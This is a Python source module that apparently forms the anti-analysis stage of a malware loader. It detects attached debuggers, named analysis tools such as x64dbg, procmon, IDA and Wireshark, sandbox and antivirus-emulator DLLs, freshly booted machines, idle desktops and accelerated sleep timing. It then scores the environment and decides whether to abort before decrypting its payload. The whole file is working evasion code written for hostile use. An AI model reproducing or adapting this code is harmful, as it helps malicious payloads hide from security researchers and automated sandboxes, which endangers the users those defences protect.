"""How much this machine looks like a place a sample is being watched.

The gate answers "is this a virtual machine". This answers a different question: "is
something looking at *this process* right now". The two overlap and neither replaces the
other — a hypervisor with a real user in it is fine to run on, and a bare-metal box with
x64dbg attached to the image is not.

Weighted, not counted. One strong signal is enough on its own: a debugger attached to
this process is not a coincidence to be averaged against three weak ones. The weights
are therefore chosen so a single decisive signal crosses the hostile line by itself and
a handful of soft ones has to add up.

Everything is injectable. ``evaluate`` takes the process set, the module set, the uptime
and the clock skew as arguments, so the decision table is testable without attaching
anything to anything — the harness this runs under does not permit a debugger.

The execution window is recorded whether or not it fires. "Ran 94 seconds after boot"
is a different report from "ran on a machine that had been up for nine days", and both
are one number away.
"""

from __future__ import annotations

import time
from dataclasses import dataclass
from typing import Final

from . import log, winapi

# Processes whose only job is to watch other processes. Lower-case, matched exactly
# against the image names ``winapi.process_names`` returns.
_ANALYSIS_PROCESSES: Final[frozenset[str]] = frozenset(
    {
        "procmon.exe",
        "procmon64.exe",
        "procexp.exe",
        "procexp64.exe",
        "processhacker.exe",
        "systeminformer.exe",
        "x64dbg.exe",
        "x32dbg.exe",
        "ollydbg.exe",
        "windbg.exe",
        "ida.exe",
        "ida64.exe",
        "idaq.exe",
        "idaq64.exe",
        "dnspy.exe",
        "pestudio.exe",
        "wireshark.exe",
        "fiddler.exe",
        "fiddler everywhere.exe",
        "httpdebuggerui.exe",
        "charles.exe",
        "mitmproxy.exe",
        "autoruns.exe",
        "autoruns64.exe",
        "tcpview.exe",
        "apimonitor-x64.exe",
        "apimonitor-x86.exe",
        "regmon.exe",
        "filemon.exe",
        "cheatengine-x86_64.exe",
        "scylla.exe",
        "immunity debugger.exe",
    }
)

# DLLs injected by sandboxes and by the emulators antivirus products run samples under.
# Checked with ``GetModuleHandleW``: a module that is loaded is a module whose code is
# already in this address space, which is the fact that matters.
_ANALYSIS_MODULES: Final[tuple[str, ...]] = (
    "sbiedll.dll",
    "snxhk.dll",
    "snxhk64.dll",
    "cmdvrt32.dll",
    "cmdvrt64.dll",
    "api_log.dll",
    "dir_watch.dll",
    "wpespy.dll",
    "pstorec.dll",
    "SxIn.dll",
    "SxIn64.dll",
)

# A sample launched within this many seconds of boot ran on a machine that was started
# for it. Ten minutes is long enough to cover a fast workstation reboot and short enough
# that a normal desktop does not reach it.
_COLD_BOOT_SECONDS: Final[int] = 600

# A desktop with fewer captioned windows than this is not being used by a person.
_QUIET_WINDOWS: Final[int] = 3

# A quarter second measured against the tick count. A sandbox that fast-forwards sleeps
# reports a wildly different number; a loaded machine can stretch it to double.
_SKEW_PROBE_SECONDS: Final[float] = 0.25
_SKEW_FAST_MS: Final[int] = 60
_SKEW_SLOW_MS: Final[int] = 1500

# score at or above this is hostile, at or above the second value is suspicious. A
# debugger alone (8) is hostile; a cold boot plus a quiet desktop (3 + 3) is suspicious.
_HOSTILE_SCORE: Final[int] = 8
_SUSPICIOUS_SCORE: Final[int] = 4


@dataclass(frozen=True, slots=True)
class Signal:
    name: str
    weight: int
    detail: str


@dataclass(frozen=True, slots=True)
class Fingerprint:
    score: int
    verdict: str
    signals: tuple[Signal, ...]
    window_seconds: int
    processes: int
    windows: int
    skew_ms: int

    @property
    def hostile(self) -> bool:
        return self.verdict == "hostile"

    @property
    def suspicious(self) -> bool:
        return self.verdict in {"hostile", "suspicious"}

    def as_dict(self) -> dict[str, object]:
        return {
            "score": self.score,
            "verdict": self.verdict,
            "signals": [
                {"name": signal.name, "weight": signal.weight, "detail": signal.detail}
                for signal in self.signals
            ],
            "execution_window": {
                "uptime_seconds": self.window_seconds,
                "cold": 0 < self.window_seconds < _COLD_BOOT_SECONDS,
            },
            "processes": self.processes,
            "windows": self.windows,
            "skew_ms": self.skew_ms,
        }


def _skew() -> int:
    """Milliseconds the monotonic sleep actually cost, measured off the tick count.

    ``None`` from the API means the platform has no tick count; the probe then returns
    the ideal value and the signal never fires.
    """
    before = winapi.uptime_ms()
    if before is None:
        return int(_SKEW_PROBE_SECONDS * 1000)
    time.sleep(_SKEW_PROBE_SECONDS)
    after = winapi.uptime_ms()
    if after is None:
        return int(_SKEW_PROBE_SECONDS * 1000)
    return int(after - before)


def _debugger_signal(attached: dict[str, bool] | None) -> Signal | None:
    if attached is None:
        attached = winapi.debugger_present()
    if attached.get("remote"):
        return Signal("debugger", 8, "remote debugger attached")
    if attached.get("local"):
        return Signal("debugger", 8, "local debugger attached")
    return None


def _process_signal(names: set[str] | frozenset[str] | None) -> Signal | None:
    if names is None:
        names = winapi.process_names()
    found = sorted({name.lower() for name in names} & _ANALYSIS_PROCESSES)
    if not found:
        return None
    return Signal("analysis-process", 6, ", ".join(found))


def _module_signal(modules: set[str] | None) -> Signal | None:
    if modules is None:
        modules = {name.lower() for name in _ANALYSIS_MODULES if winapi.module_present(name)}
    else:
        modules = {name.lower() for name in modules}
    found = sorted(modules & {name.lower() for name in _ANALYSIS_MODULES})
    if not found:
        return None
    return Signal("analysis-module", 6, ", ".join(found))


def _boot_signal(seconds: int) -> Signal | None:
    if 0 < seconds < _COLD_BOOT_SECONDS:
        return Signal("cold-boot", 3, f"uptime {seconds} s")
    return None


def _window_signal(windows: int | None) -> Signal | None:
    if windows is None:
        windows = winapi.window_count()
    if windows < _QUIET_WINDOWS:
        return Signal("quiet-desktop", 3, f"{windows} captioned window(s)")
    return None


def _skew_signal(skew: int | None) -> Signal | None:
    if skew is None:
        skew = _skew()
    if skew < _SKEW_FAST_MS:
        # A sleep that returns in a tenth of its time is a clock being driven forward
        # by the host. There is no load condition that produces it, so it stands alone.
        return Signal("clock-accelerated", 8, f"{skew} ms for a 250 ms sleep")
    if skew > _SKEW_SLOW_MS:
        # The opposite is not decisive: a box under a compile, or one swapping, really
        # does stretch a quarter second. Worth naming, not worth abandoning over.
        return Signal("sleep-skew", 5, f"{skew} ms for a 250 ms sleep")
    return None


def evaluate(
    *,
    processes: set[str] | frozenset[str] | None = None,
    modules: set[str] | None = None,
    uptime_ms: int | None = None,
    debugger: dict[str, bool] | None = None,
    windows: int | None = None,
    skew_ms: int | None = None,
    probe: bool = True,
) -> Fingerprint:
    """Score this process's environment. Never raises; a failed probe is a no-signal.

    ``probe=False`` skips the sleep-based skew check, which is the only part of this
    that costs wall clock. Entry runs it once, before decryption, where 250 ms is not
    worth arguing about.
    """
    uptime = uptime_ms if uptime_ms is not None else (winapi.uptime_ms() or 0)
    seconds = int(uptime // 1000)
    process_count = len(processes) if processes is not None else len(winapi.process_names())
    window_total = windows if windows is not None else winapi.window_count()

    signals: list[Signal] = []
    for candidate in (
        _debugger_signal(debugger),
        _process_signal(processes),
        _module_signal(modules),
        _boot_signal(seconds),
        _window_signal(window_total),
        _skew_signal(skew_ms if skew_ms is not None else (_skew() if probe else None)),
    ):
        if candidate is not None:
            signals.append(candidate)

    score = sum(signal.weight for signal in signals)
    if score >= _HOSTILE_SCORE:
        verdict = "hostile"
    elif score >= _SUSPICIOUS_SCORE:
        verdict = "suspicious"
    else:
        verdict = "clean"

    if signals:
        log.logger.debug(
            "fingerprint: %s score=%d %s",
            verdict,
            score,
            "; ".join(f"{signal.name}({signal.weight})" for signal in signals),
        )

    return Fingerprint(
        score=score,
        verdict=verdict,
        signals=tuple(signals),
        window_seconds=seconds,
        processes=process_count,
        windows=window_total,
        skew_ms=int(skew_ms if skew_ms is not None else 0),
    )


def should_stop(mode: str, fingerprint: Fingerprint) -> bool:
    """Whether the configured mode says this fingerprint ends the run before decryption."""
    if mode == "off":
        return False
    if mode == "warn":
        return False
    return fingerprint.hostile


__all__ = ["Fingerprint", "Signal", "evaluate", "should_stop"]
